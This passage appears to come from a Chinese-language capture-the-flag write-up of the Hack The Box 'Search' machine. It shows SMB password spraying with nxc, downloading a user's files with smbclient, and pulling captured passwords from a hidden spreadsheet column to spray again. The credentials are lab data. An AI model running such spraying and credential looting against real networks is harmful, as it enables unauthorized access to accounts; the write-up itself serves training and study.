SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE 
```

看看 edgar.jacobs 的文件夹。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ smbclient \\\\10.129.229.57\\RedirectedFolders$ -U 'search.htb/edgar.jacobs%@3ONEmillionbaby' -c 'cd edgar.jacobs;recurse ON prompt OFF;ls'
  .                                  Dc        0  Thu Apr  9 16:04:11 2020
  ..                                 Dc        0  Thu Apr  9 16:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 06:02:16 2020
  Documents                         DRc        0  Mon Aug 10 06:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 06:02:17 2020

\edgar.jacobs\Desktop
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020

\edgar.jacobs\Documents
  .                                 DRc        0  Mon Aug 10 06:02:17 2020
  ..                                DRc        0  Mon Aug 10 06:02:17 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      402  Mon Aug 10 06:02:17 2020

\edgar.jacobs\Downloads
  .                                 DRc        0  Mon Aug 10 06:02:17 2020
  ..                                DRc        0  Mon Aug 10 06:02:17 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:17 2020

\edgar.jacobs\Desktop\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 16:05:29 2020
  ..                               DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      129  Thu Apr  9 16:05:30 2020

\edgar.jacobs\Documents\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 16:05:30 2020
  ..                               DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      129  Thu Apr  9 16:05:31 2020

\edgar.jacobs\Downloads\$RECYCLE.BIN
  .                                DHSc        0  Thu Apr  9 16:05:30 2020
  ..                               DHSc        0  Thu Apr  9 16:05:30 2020
  desktop.ini                      AHSc      129  Thu Apr  9 16:05:30 2020

                3246079 blocks of size 4096. 768759 blocks available

```

下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/edgar.jacobs_file]
└─$ smbclient \\\\10.129.229.57\\RedirectedFolders$ -U 'search.htb/edgar.jacobs%@3ONEmillionbaby' -c 'cd edgar.jacobs;recurse ON prompt OFF;mget *'
Get directory Desktop? y
Get directory Documents? y
Get directory Downloads? y
Get directory $RECYCLE.BIN? y
Get file desktop.ini? y
getting file \edgar.jacobs\Desktop\desktop.ini of size 282 as Desktop/desktop.ini (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
Get file Microsoft Edge.lnk? y
getting file \edgar.jacobs\Desktop\Microsoft Edge.lnk of size 1450 as Desktop/Microsoft Edge.lnk (4.4 KiloBytes/sec) (average 1.9 KiloBytes/sec)
Get file Phishing_Attempt.xlsx? y
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Desktop/Phishing_Attempt.xlsx (24.0 KiloBytes/sec) (average 13.2 KiloBytes/sec)
Get directory $RECYCLE.BIN? y
Get file desktop.ini? y
getting file \edgar.jacobs\Documents\desktop.ini of size 402 as Documents/desktop.ini (1.3 KiloBytes/sec) (average 11.5 KiloBytes/sec)
yGet directory $RECYCLE.BIN? y
Get file desktop.ini? y
getting file \edgar.jacobs\Downloads\desktop.ini of size 282 as Downloads/desktop.ini (0.3 KiloBytes/sec) (average 8.5 KiloBytes/sec)
Get file desktop.ini? y
getting file \edgar.jacobs\Desktop\$RECYCLE.BIN\desktop.ini of size 129 as Desktop/$RECYCLE.BIN/desktop.ini (0.4 KiloBytes/sec) (average 7.7 KiloBytes/sec)
Get file desktop.ini? y
getting file \edgar.jacobs\Documents\$RECYCLE.BIN\desktop.ini of size 129 as Documents/$RECYCLE.BIN/desktop.ini (0.2 KiloBytes/sec) (average 6.2 KiloBytes/sec)
Get file desktop.ini? y
getting file \edgar.jacobs\Downloads\$RECYCLE.BIN\desktop.ini of size 129 as Downloads/$RECYCLE.BIN/desktop.ini (0.4 KiloBytes/sec) (average 5.8 KiloBytes/sec)
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Search/edgar.jacobs_file]
└─$ ls
Desktop  Documents  Downloads


```

这个 xlsx 是一个 zip 压缩包，解压下来。

```bash
┌──(kali㉿kali)-[~/…/Kali/Search/edgar.jacobs_file/Desktop]
└─$ file Phishing_Attempt.xlsx                                               
Phishing_Attempt.xlsx: Microsoft Excel 2007+
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/Kali/Search/edgar.jacobs_file/Desktop]
└─$ unzip -l Phishing_Attempt.xlsx             
Archive:  Phishing_Attempt.xlsx
  Length      Date    Time    Name
---------  ---------- -----   ----
     1996  1980-01-01 00:00   [Content_Types].xml
      588  1980-01-01 00:00   _rels/.rels
     1924  1980-01-01 00:00   xl/workbook.xml
      972  1980-01-01 00:00   xl/_rels/workbook.xml.rels
     5732  1980-01-01 00:00   xl/worksheets/sheet1.xml
     4696  1980-01-01 00:00   xl/worksheets/sheet2.xml
     8390  1980-01-01 00:00   xl/theme/theme1.xml
    17042  1980-01-01 00:00   xl/styles.xml
     1629  1980-01-01 00:00   xl/sharedStrings.xml
     1232  1980-01-01 00:00   xl/drawings/drawing1.xml
     8669  1980-01-01 00:00   xl/charts/chart1.xml
     9863  1980-01-01 00:00   xl/charts/style1.xml
      878  1980-01-01 00:00   xl/charts/colors1.xml
      464  1980-01-01 00:00   xl/worksheets/_rels/sheet1.xml.rels
      322  1980-01-01 00:00   xl/worksheets/_rels/sheet2.xml.rels
      293  1980-01-01 00:00   xl/drawings/_rels/drawing1.xml.rels
      399  1980-01-01 00:00   xl/charts/_rels/chart1.xml.rels
     4840  1980-01-01 00:00   xl/printerSettings/printerSettings1.bin
     4840  1980-01-01 00:00   xl/printerSettings/printerSettings2.bin
      396  1980-01-01 00:00   xl/calcChain.xml
      580  1980-01-01 00:00   docProps/core.xml
      807  1980-01-01 00:00   docProps/app.xml
---------                     -------
    76552                     22 files

```

```bash
┌──(kali㉿kali)-[~/…/Kali/Search/edgar.jacobs_file/Desktop]
└─$ unzip Phishing_Attempt.xlsx -d extracted
Archive:  Phishing_Attempt.xlsx
  inflating: extracted/[Content_Types].xml  
  inflating: extracted/_rels/.rels   
  inflating: extracted/xl/workbook.xml  
  inflating: extracted/xl/_rels/workbook.xml.rels  
  inflating: extracted/xl/worksheets/sheet1.xml  
  inflating: extracted/xl/worksheets/sheet2.xml  
  inflating: extracted/xl/theme/theme1.xml  
  inflating: extracted/xl/styles.xml  
  inflating: extracted/xl/sharedStrings.xml  
  inflating: extracted/xl/drawings/drawing1.xml  
  inflating: extracted/xl/charts/chart1.xml  
  inflating: extracted/xl/charts/style1.xml  
  inflating: extracted/xl/charts/colors1.xml  
  inflating: extracted/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: extracted/xl/worksheets/_rels/sheet2.xml.rels  
  inflating: extracted/xl/drawings/_rels/drawing1.xml.rels  
  inflating: extracted/xl/charts/_rels/chart1.xml.rels  
  inflating: extracted/xl/printerSettings/printerSettings1.bin  
  inflating: extracted/xl/printerSettings/printerSettings2.bin  
  inflating: extracted/xl/calcChain.xml  
  inflating: extracted/docProps/core.xml  
  inflating: extracted/docProps/app.xml  
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/Kali/Search/edgar.jacobs_file/Desktop]
└─$ ls
'$RECYCLE.BIN'   desktop.ini   extracted  'Microsoft Edge.lnk'   Phishing_Attempt.xlsx
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/Kali/Search/edgar.jacobs_file/Desktop]
└─$ cd extracted        
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/Search/edgar.jacobs_file/Desktop/extracted]
└─$ ls
'[Content_Types].xml'   docProps   _rels   xl

```

看这个结构，sharedStrings.xml 和 sheet1.xml.rels、sheet2.xml.rels 很可能有高价值信息。

```bash
┌──(kali㉿kali)-[~/…/Search/edgar.jacobs_file/Desktop/extracted]
└─$ tree                
.
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   └── core.xml
├── _rels
└── xl
    ├── calcChain.xml
    ├── charts
    │   ├── chart1.xml
    │   ├── colors1.xml
    │   ├── _rels
    │   │   └── chart1.xml.rels
    │   └── style1.xml
    ├── drawings
    │   ├── drawing1.xml
    │   └── _rels
    │       └── drawing1.xml.rels
    ├── printerSettings
    │   ├── printerSettings1.bin
    │   └── printerSettings2.bin
    ├── _rels
    │   └── workbook.xml.rels
    ├── sharedStrings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── workbook.xml
    └── worksheets
        ├── _rels
        │   ├── sheet1.xml.rels
        │   └── sheet2.xml.rels
        ├── sheet1.xml
        └── sheet2.xml

```

查看一下。

```bash
┌──(kali㉿kali)-[~/…/edgar.jacobs_file/Desktop/extracted/xl]
└─$ cat sharedStrings.xml    
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="49" uniqueCount="49"><si><t>firstname</t></si><si><t>lastname</t></si><si><t>password</t></si><si><t>Payton</t></si><si><t>Harmon</t></si><si><t>Cortez</t></si><si><t>Hickman</t></si><si><t>Bobby</t></si><si><t>Wolf</t></si><si><t>Margaret</t></si><si><t>Robinson</t></si><si><t>Costa</t></si><si><t>Scarlett</t></si><si><t>Parks</t></si><si><t>Eliezer</t></si><si><t>Jordan</t></si><si><t>Hunter</t></si><si><t>Kirby</t></si><si><t>Annabelle</t></si><si><t>Wells</t></si><si><t>Eve</t></si><si><t>Galvan</t></si><si><t>Jeramiah</t></si><si><t>Fritz</t></si><si><t>Abby</t></si><si><t>Gonzalez</t></si><si><t>Joy</t></si><si><t>Vincent</t></si><si><t>Sutton</t></si><si><t>Sierra</t></si><si><t>Frye</t></si><si><t>Username</t></si><si><t>Date</t></si><si><t>Captured Passwords</t></si><si><t>IT ChangeOver Keely Lyons Started</t></si><si><t>//51+mountain+DEAR+noise+83//</t></si><si><t>++47|building|WARSAW|gave|60++</t></si><si><t>!!05_goes_SEVEN_offer_83!!</t></si><si><t>~~27%when%VILLAGE%full%00~~</t></si><si><t>==95~pass~QUIET~austria~77==</t></si><si><t>//61!banker!FANCY!measure!25//</t></si><si><t>??40:student:MAYOR:been:66??</t></si><si><t>&amp;&amp;75:major:RADIO:state:93&amp;&amp;</t></si><si><t>**30*venus*BALL*office*42**</t></si><si><t>;;36!cried!INDIA!year!50;;</t></si><si><t>..10-time-TALK-proud-66..</t></si><si><t>??47^before^WORLD^surprise^91??</t></si><si><t>**24&amp;moment&amp;BRAZIL&amp;members&amp;66**</t></si><si><t>$$49=wide=STRAIGHT=jordan=28$$18</t></si></sst>
```

```bash
┌──(kali㉿kali)-[~/…/Desktop/extracted/xl/worksheets]
└─$ cat sheet1.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac xr xr2 xr3" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" xr:uid="{00000000-0001-0000-0000-000000000000}"><dimension ref="A1:C41"/><sheetViews><sheetView workbookViewId="0"><selection activeCell="G23" sqref="G23"/></sheetView></sheetViews><sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/><cols><col min="1" max="1" width="10.7109375" bestFit="1" customWidth="1"/><col min="2" max="2" width="19.140625" bestFit="1" customWidth="1"/></cols><sheetData><row r="1" spans="1:2" x14ac:dyDescent="0.25"><c r="A1" t="s"><v>32</v></c><c r="B1" t="s"><v>33</v></c></row><row r="2" spans="1:2" x14ac:dyDescent="0.25"><c r="A2" s="1"><v>43101</v></c><c r="B2"><v>78</v></c></row><row r="3" spans="1:2" x14ac:dyDescent="0.25"><c r="A3" s="1"><v>43132</v></c><c r="B3"><v>64</v></c></row><row r="4" spans="1:2" x14ac:dyDescent="0.25"><c r="A4" s="1"><v>43160</v></c><c r="B4"><v>60</v></c></row><row r="5" spans="1:2" x14ac:dyDescent="0.25"><c r="A5" s="1"><v>43191</v></c><c r="B5"><v>48</v></c></row><row r="6" spans="1:2" x14ac:dyDescent="0.25"><c r="A6" s="1"><v>43221</v></c><c r="B6"><v>56</v></c></row><row r="7" spans="1:2" x14ac:dyDescent="0.25"><c r="A7" s="1"><v>43252</v></c><c r="B7"><v>42</v></c></row><row r="8" spans="1:2" x14ac:dyDescent="0.25"><c r="A8" s="1"><v>43282</v></c><c r="B8"><v>48</v></c></row><row r="9" spans="1:2" x14ac:dyDescent="0.25"><c r="A9" s="1"><v>43313</v></c><c r="B9"><v>57</v></c></row><row r="10" spans="1:2" x14ac:dyDescent="0.25"><c r="A10" s="1"><v>43344</v></c><c r="B10"><v>46</v></c></row><row r="11" spans="1:2" x14ac:dyDescent="0.25"><c r="A11" s="1"><v>43374</v></c><c r="B11"><v>47</v></c></row><row r="12" spans="1:2" x14ac:dyDescent="0.25"><c r="A12" s="1"><v>43405</v></c><c r="B12"><v>63</v></c></row><row r="13" spans="1:2" x14ac:dyDescent="0.25"><c r="A13" s="1"><v>43435</v></c><c r="B13"><v>68</v></c></row><row r="14" spans="1:2" x14ac:dyDescent="0.25"><c r="A14" s="1"><v>43466</v></c><c r="B14"><v>71</v></c></row><row r="15" spans="1:2" x14ac:dyDescent="0.25"><c r="A15" s="1"><v>43497</v></c><c r="B15"><v>63</v></c></row><row r="16" spans="1:2" x14ac:dyDescent="0.25"><c r="A16" s="1"><v>43525</v></c><c r="B16"><v>51</v></c></row><row r="17" spans="1:3" x14ac:dyDescent="0.25"><c r="A17" s="1"><v>43556</v></c><c r="B17"><v>74</v></c></row><row r="18" spans="1:3" x14ac:dyDescent="0.25"><c r="A18" s="1"><v>43586</v></c><c r="B18"><v>64</v></c></row><row r="19" spans="1:3" x14ac:dyDescent="0.25"><c r="A19" s="1"><v>43617</v></c><c r="B19"><v>81</v></c></row><row r="20" spans="1:3" x14ac:dyDescent="0.25"><c r="A20" s="1"><v>43647</v></c><c r="B20"><v>79</v></c><c r="C20" t="s"><v>34</v></c></row><row r="21" spans="1:3" x14ac:dyDescent="0.25"><c r="A21" s="1"><v>43678</v></c><c r="B21"><v>72</v></c></row><row r="22" spans="1:3" x14ac:dyDescent="0.25"><c r="A22" s="1"><v>43709</v></c><c r="B22"><v>65</v></c></row><row r="23" spans="1:3" x14ac:dyDescent="0.25"><c r="A23" s="1"><v>43739</v></c><c r="B23"><v>63</v></c></row><row r="24" spans="1:3" x14ac:dyDescent="0.25"><c r="A24" s="1"><v>43770</v></c><c r="B24"><v>61</v></c></row><row r="25" spans="1:3" x14ac:dyDescent="0.25"><c r="A25" s="1"><v>43800</v></c><c r="B25"><v>58</v></c></row><row r="26" spans="1:3" x14ac:dyDescent="0.25"><c r="A26" s="1"><v>43831</v></c><c r="B26"><v>59</v></c></row><row r="27" spans="1:3" x14ac:dyDescent="0.25"><c r="A27" s="1"><v>43862</v></c><c r="B27"><v>51</v></c></row><row r="28" spans="1:3" x14ac:dyDescent="0.25"><c r="A28" s="1"><v>43891</v></c><c r="B28"><v>48</v></c></row><row r="29" spans="1:3" x14ac:dyDescent="0.25"><c r="A29" s="1"><v>43922</v></c><c r="B29"><v>42</v></c></row><row r="30" spans="1:3" x14ac:dyDescent="0.25"><c r="A30" s="1"><v>43952</v></c><c r="B30"><v>38</v></c></row><row r="31" spans="1:3" x14ac:dyDescent="0.25"><c r="A31" s="1"><v>43983</v></c><c r="B31"><v>31</v></c></row><row r="32" spans="1:3" x14ac:dyDescent="0.25"><c r="A32" s="1"><v>44013</v></c><c r="B32"><v>29</v></c></row><row r="33" spans="1:2" x14ac:dyDescent="0.25"><c r="A33" s="1"><v>44044</v></c><c r="B33"><v>27</v></c></row><row r="34" spans="1:2" x14ac:dyDescent="0.25"><c r="A34" s="1"><v>44075</v></c><c r="B34"><v>25</v></c></row><row r="35" spans="1:2" x14ac:dyDescent="0.25"><c r="A35" s="1"><v>44105</v></c><c r="B35"><v>24</v></c></row><row r="36" spans="1:2" x14ac:dyDescent="0.25"><c r="A36" s="1"><v>44136</v></c><c r="B36"><v>21</v></c></row><row r="37" spans="1:2" x14ac:dyDescent="0.25"><c r="A37" s="1"><v>44166</v></c><c r="B37"><v>18</v></c></row><row r="38" spans="1:2" x14ac:dyDescent="0.25"><c r="A38" s="1"><v>44197</v></c><c r="B38"><v>17</v></c></row><row r="39" spans="1:2" x14ac:dyDescent="0.25"><c r="A39" s="1"><v>44228</v></c><c r="B39"><v>15</v></c></row><row r="40" spans="1:2" x14ac:dyDescent="0.25"><c r="A40" s="1"><v>44256</v></c><c r="B40"><v>16</v></c></row><row r="41" spans="1:2" x14ac:dyDescent="0.25"><c r="A41" s="1"><v>44287</v></c><c r="B41"><v>14</v></c></row></sheetData><pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/><pageSetup paperSize="9" orientation="portrait" r:id="rId1"/><drawing r:id="rId2"/></worksheet>                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/Desktop/extracted/xl/worksheets]
└─$ cat sheet2.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac xr xr2 xr3" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" xr:uid="{00000000-0001-0000-0100-000000000000}"><dimension ref="A1:D17"/><sheetViews><sheetView tabSelected="1" workbookViewId="0"><selection activeCell="F19" sqref="F19"/></sheetView></sheetViews><sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/><cols><col min="1" max="1" width="10.140625" bestFit="1" customWidth="1"/><col min="3" max="3" width="37.5703125" hidden="1" customWidth="1"/><col min="4" max="4" width="19.140625" bestFit="1" customWidth="1"/></cols><sheetData><row r="1" spans="1:4" x14ac:dyDescent="0.25"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c><c r="C1" t="s"><v>2</v></c><c r="D1" t="s"><v>31</v></c></row><row r="2" spans="1:4" x14ac:dyDescent="0.25"><c r="A2" t="s"><v>3</v></c><c r="B2" t="s"><v>4</v></c><c r="C2" t="s"><v>44</v></c><c r="D2" t="str"><f t="shared" ref="D2:D7" si="0">A2&amp;"."&amp;B2</f><v>Payton.Harmon</v></c></row><row r="3" spans="1:4" x14ac:dyDescent="0.25"><c r="A3" t="s"><v>5</v></c><c r="B3" t="s"><v>6</v></c><c r="C3" t="s"><v>45</v></c><c r="D3" t="str"><f t="shared" si="0"/><v>Cortez.Hickman</v></c></row><row r="4" spans="1:4" x14ac:dyDescent="0.25"><c r="A4" t="s"><v>7</v></c><c r="B4" t="s"><v>8</v></c><c r="C4" t="s"><v>46</v></c><c r="D4" t="str"><f t="shared" si="0"/><v>Bobby.Wolf</v></c></row><row r="5" spans="1:4" x14ac:dyDescent="0.25"><c r="A5" t="s"><v>9</v></c><c r="B5" t="s"><v>10</v></c><c r="C5" t="s"><v>35</v></c><c r="D5" t="str"><f t="shared" si="0"/><v>Margaret.Robinson</v></c></row><row r="6" spans="1:4" x14ac:dyDescent="0.25"><c r="A6" t="s"><v>12</v></c><c r="B6" t="s"><v>13</v></c><c r="C6" s="2" t="s"><v>36</v></c><c r="D6" t="str"><f t="shared" si="0"/><v>Scarlett.Parks</v></c></row><row r="7" spans="1:4" x14ac:dyDescent="0.25"><c r="A7" t="s"><v>14</v></c><c r="B7" t="s"><v>15</v></c><c r="C7" t="s"><v>37</v></c><c r="D7" t="str"><f t="shared" si="0"/><v>Eliezer.Jordan</v></c></row><row r="8" spans="1:4" x14ac:dyDescent="0.25"><c r="A8" t="s"><v>16</v></c><c r="B8" t="s"><v>17</v></c><c r="C8" t="s"><v>38</v></c><c r="D8" t="str"><f t="shared" ref="D8:D15" si="1">A8&amp;"."&amp;B8</f><v>Hunter.Kirby</v></c></row><row r="9" spans="1:4" x14ac:dyDescent="0.25"><c r="A9" t="s"><v>29</v></c><c r="B9" t="s"><v>30</v></c><c r="C9" s="3" t="s"><v>48</v></c><c r="D9" t="str"><f>A9&amp;"."&amp;B9</f><v>Sierra.Frye</v></c></row><row r="10" spans="1:4" x14ac:dyDescent="0.25"><c r="A10" t="s"><v>18</v></c><c r="B10" t="s"><v>19</v></c><c r="C10" s="2" t="s"><v>39</v></c><c r="D10" t="str"><f t="shared" si="1"/><v>Annabelle.Wells</v></c></row><row r="11" spans="1:4" x14ac:dyDescent="0.25"><c r="A11" t="s"><v>20</v></c><c r="B11" t="s"><v>21</v></c><c r="C11" t="s"><v>40</v></c><c r="D11" t="str"><f t="shared" si="1"/><v>Eve.Galvan</v></c></row><row r="12" spans="1:4" x14ac:dyDescent="0.25"><c r="A12" t="s"><v>22</v></c><c r="B12" t="s"><v>23</v></c><c r="C12" t="s"><v>41</v></c><c r="D12" t="str"><f t="shared" si="1"/><v>Jeramiah.Fritz</v></c></row><row r="13" spans="1:4" x14ac:dyDescent="0.25"><c r="A13" t="s"><v>24</v></c><c r="B13" t="s"><v>25</v></c><c r="C13" t="s"><v>42</v></c><c r="D13" t="str"><f t="shared" si="1"/><v>Abby.Gonzalez</v></c></row><row r="14" spans="1:4" x14ac:dyDescent="0.25"><c r="A14" t="s"><v>26</v></c><c r="B14" t="s"><v>11</v></c><c r="C14" t="s"><v>43</v></c><c r="D14" t="str"><f t="shared" si="1"/><v>Joy.Costa</v></c></row><row r="15" spans="1:4" x14ac:dyDescent="0.25"><c r="A15" t="s"><v>27</v></c><c r="B15" t="s"><v>28</v></c><c r="C15" t="s"><v>47</v></c><c r="D15" t="str"><f t="shared" si="1"/><v>Vincent.Sutton</v></c></row><row r="17" spans="3:3" x14ac:dyDescent="0.25"><c r="C17" s="4"/></row></sheetData><sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/><pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/><pageSetup paperSize="9" orientation="portrait" r:id="rId1"/></worksheet>
```

信息很乱，肉眼分辨不出来，丢给 AI。

![](Pasted%20image%2020260814141150.png)

- A1 → `Date`
- B1 → `Captured Passwords`
- C20 → `IT ChangeOver Keely Lyons Started`

将得到的信息保存为一个字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ vim xlsx_users.txt
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ vim xlsx_pass.txt 
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ cat xlsx_pass.txt 
;;36!cried!INDIA!year!50;;
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
!!05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
$$49=wide=STRAIGHT=jordan=28$$18
==95~pass~QUIET~austria~77==
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
&&75:major:RADIO:state:93&&
**30*venus*BALL*office*42**
**24&moment&BRAZIL&members&66**
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ cat xlsx_users.txt 
Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton

```

爆破一下，使用 --no-bruteforce 确保账号密码一一对应。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search/Users]
└─$ nxc smb search.htb -u xlsx_users.txt -p xlsx_pass.txt --no-bruteforce --continue-on-success 
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
SMB         10.129.229.57   445    RESEARCH         [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
